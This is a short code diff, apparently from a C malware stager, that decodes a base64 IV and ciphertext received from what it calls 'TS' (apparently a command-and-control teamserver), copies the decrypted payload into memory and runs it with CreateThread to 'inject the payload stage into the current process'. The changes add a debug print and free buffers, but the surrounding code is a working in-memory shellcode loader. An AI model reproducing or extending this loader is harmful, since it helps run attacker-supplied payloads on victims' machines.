@@ -657,7 +657,7 @@ int main(int argc, char* argv[])
 	iv_size = Base64decode(iv, b64iv);
 	ct_size = Base64decode(ct, b64ct);
 	debug_print("Recv %d byte ct from TS\n", ct_size);
-	
+	debug_print("Start of ct: %.10s\n", ct);
 	// Decrypt payload
 	struct AES_ctx ctx;
 	//AES_init_ctx(&ctx, key);
@@ -666,7 +666,10 @@ int main(int argc, char* argv[])
 
 	memcpy(payload, ct, ct_size);
 	debug_print("Start of payload: %.10s\n", payload);
-
+	free(iv);
+	free(ct);
+	free(b64iv);
+	free(b64ct);
 	/* inject the payload stage into the current process */
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
 
